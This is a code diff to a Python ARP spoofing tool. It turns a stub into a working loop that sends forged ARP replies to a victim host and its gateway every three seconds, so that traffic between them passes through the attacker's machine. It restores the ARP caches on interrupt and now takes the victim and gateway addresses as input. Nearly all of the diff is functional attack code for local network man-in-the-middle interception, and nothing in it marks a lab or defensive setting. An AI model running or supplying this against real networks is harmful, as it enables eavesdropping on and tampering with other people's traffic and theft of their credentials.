@@ -1,6 +1,7 @@
 import socket 
 import struct
 import fcntl
+import time
 
 
 class errors():
@@ -54,10 +55,23 @@ class arpspoof():
     def get_own_mac(self) -> bytes:
         return self.sock.getsockname()[4]
     
-    def start_arpspoofing(self, victim_ip : bytes, gateway_ip : bytes):
-        victim_mac = self.get_target_mac(victim_ip)
-        gateway_mac = self.get_target_mac(gateway_ip)
-        print(victim_mac, gateway_mac)
+    def start_arpspoofing(self, victim_ip : bytes, victim_mac : bytes, gateway_ip : bytes, gateway_mac : bytes):
+        own_ip = self.get_own_ip()
+        own_mac = self.get_own_mac()
+        try:
+            while True:
+                self.send_packet(False, own_mac, gateway_ip, victim_mac, victim_ip)
+                print('[*] Send ARP bad packet to victim')
+                self.send_packet(False, own_mac, victim_ip, gateway_mac, gateway_ip)
+                print('[*] Send ARP bad packet to gateway')
+                time.sleep(3)
+        except KeyboardInterrupt:
+            for _ in range(3):
+                self.send_packet(False, gateway_mac, gateway_ip, victim_mac, victim_ip)
+                print('[*] Send ARP normal packet to victim')
+                self.send_packet(False, victim_mac, victim_ip, gateway_mac, gateway_ip)
+                print('[*] Send ARP normal packet to gateway')
+        
 
 def mac_from_string_to_bytes(mac : str) -> bytes:
     try:
@@ -76,11 +90,11 @@ def ipv4_from_string_to_bytes(ip : str) -> bytes:
 
 if __name__ == "__main__":
     interface = input('interface>>>')
-    victim_ip = input('victim_ip>>>')
-    victim_mac = input('victim_mac>>>')
-    gateway_ip = input('gateway_ip>>>')
-    gateway_mac = input('gateway_mac>>>')
+    victim_ip = ipv4_from_string_to_bytes(input('victim_ip>>>'))
+    victim_mac = mac_from_string_to_bytes(input('victim_mac>>>'))
+    gateway_ip = ipv4_from_string_to_bytes(input('gateway_ip>>>'))
+    gateway_mac = mac_from_string_to_bytes(input('gateway_mac>>>'))
 
-    # spoof = arpspoof(interface)
-    # spoof.start_arpspoofing(socket.inet_aton(victim_ip), socket.inet_aton(gateway_ip))
-    # spoof.sock.close()
+    spoof = arpspoof(interface)
+    spoof.start_arpspoofing(victim_ip, victim_mac, gateway_ip, gateway_mac)
+    spoof.sock.close()
